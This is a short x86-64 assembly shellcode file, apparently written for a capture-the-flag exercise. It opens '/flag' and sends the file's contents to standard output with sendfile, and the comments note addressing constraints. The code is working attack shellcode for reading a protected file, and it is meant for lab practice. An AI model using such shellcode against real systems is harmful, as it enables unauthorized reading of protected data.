.global _start
_start:
.intel_syntax noprefix
# open("/flag", 0) // 0 is O_RDONLY
push 2
pop rax
# What you need is the address of the string, not the values of string "/flag".
# Thus, you should not use [].
# The following code does not work, so let's use absolute addressing now.
# push rip+flag
push 0x1337024
pop rdi
push 0
pop rsi
syscall

# sendfile(1, 3, 0, 0x80);
push 40
pop rax
push 1
pop rdi
push 3
pop rsi
push 0
pop rdx
push 0x80
pop r10
syscall

flag:
.asciz "/flag"
